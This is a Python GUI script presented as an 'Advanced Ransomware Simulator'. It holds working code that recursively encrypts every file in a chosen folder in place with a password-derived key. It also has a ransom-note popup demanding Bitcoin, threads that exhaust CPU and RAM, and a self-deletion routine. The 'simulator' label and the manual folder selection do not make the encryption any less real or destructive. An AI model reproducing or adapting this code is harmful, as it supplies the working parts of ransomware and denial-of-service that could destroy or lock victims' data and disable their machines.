import os
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from cryptography.fernet import Fernet
import threading
import base64
import hashlib
import time
import shutil
import multiprocessing
import psutil

# Generate encryption key from user-provided password
def generate_key(password):
    key = hashlib.sha256(password.encode()).digest()
    return base64.urlsafe_b64encode(key)

# Save key securely
def save_key(key):
    with open("ransom_key.key", "wb") as key_file:
        key_file.write(key)

# Load encryption key
def load_key():
    try:
        with open("ransom_key.key", "rb") as key_file:
            return key_file.read()
    except FileNotFoundError:
        return None

# Ask user for password
password = simpledialog.askstring("Password", "Enter encryption password:", show='*')
if not password:
    messagebox.showerror("Error", "No password entered. Exiting.")
    exit()

encryption_key = generate_key(password)
if not load_key():
    save_key(encryption_key)
cipher = Fernet(encryption_key)

# Encrypt files in a selected directory
def encrypt_files():
    folder_selected = filedialog.askdirectory()
    if not folder_selected:
        return

    def encrypt_worker():
        for root, _, files in os.walk(folder_selected):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    encrypted_data = cipher.encrypt(data)
                    with open(file_path, "wb") as f:
                        f.write(encrypted_data)
                except Exception as e:
                    print(f"Error encrypting {file}: {e}")
        messagebox.showinfo("Encryption Complete", "All files in the folder have been encrypted!")
    
    threading.Thread(target=encrypt_worker).start()

# Decrypt files in a selected directory
def decrypt_files():
    folder_selected = filedialog.askdirectory()
    if not folder_selected:
        return
    
    def decrypt_worker():
        for root, _, files in os.walk(folder_selected):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as f:
                        data = f.read()
                    decrypted_data = cipher.decrypt(data)
                    with open(file_path, "wb") as f:
                        f.write(decrypted_data)
                except Exception as e:
                    print(f"Error decrypting {file}: {e}")
        messagebox.showinfo("Decryption Complete", "All files in the folder have been decrypted!")
    
    threading.Thread(target=decrypt_worker).start()

# Fake Ransom Note
def show_ransom_note():
    ransom_message = """
    Your files have been encrypted!
    To recover them, send 1 BTC to the following address:
    (Fake Address)
    Use the decryption tool to recover your files after payment.
    """
    messagebox.showwarning("Ransom Note", ransom_message)

# Max CPU usage function
def max_cpu_usage():
    def cpu_stress():
        while True:
            pass
    
    cpu_count = multiprocessing.cpu_count()
    for _ in range(cpu_count):
        threading.Thread(target=cpu_stress).start()

# Max RAM usage function
def max_ram_usage():
    memory_hog = []
    while True:
        memory_hog.append(bytearray(10000000))  # Allocate 10MB at a time
        time.sleep(0.1)

# Self-delete functionality
def self_delete():
    try:
        script_path = os.path.abspath(__file__)
        shutil.move(script_path, script_path + ".bak")
        time.sleep(2)
        os.remove(script_path + ".bak")
        messagebox.showinfo("Self-Destruction", "The ransomware script has been deleted!")
    except Exception as e:
        print(f"Error deleting script: {e}")

# GUI setup
root = tk.Tk()
root.title("Advanced Ransomware Simulator")
root.geometry("500x450")
root.configure(bg="#222")

label = tk.Label(root, text="Automated Ransomware Simulator", font=("Arial", 14), fg="white", bg="#222")
label.pack(pady=10)

encrypt_button = tk.Button(root, text="Encrypt Files", command=encrypt_files, bg="red", fg="white", font=("Arial", 12))
encrypt_button.pack(pady=5)

decrypt_button = tk.Button(root, text="Decrypt Files", command=decrypt_files, bg="green", fg="white", font=("Arial", 12))
decrypt_button.pack(pady=5)

ransom_button = tk.Button(root, text="Show Ransom Note", command=show_ransom_note, bg="yellow", font=("Arial", 12))
ransom_button.pack(pady=5)

cpu_button = tk.Button(root, text="Max CPU Usage", command=max_cpu_usage, bg="orange", font=("Arial", 12))
cpu_button.pack(pady=5)

ram_button = tk.Button(root, text="Max RAM Usage", command=lambda: threading.Thread(target=max_ram_usage).start(), bg="purple", font=("Arial", 12))
ram_button.pack(pady=5)

self_delete_button = tk.Button(root, text="Self-Destruct", command=self_delete, bg="gray", fg="white", font=("Arial", 12))
self_delete_button.pack(pady=5)

exit_button = tk.Button(root, text="Exit", command=root.quit, font=("Arial", 12))
exit_button.pack(pady=10)

root.mainloop()
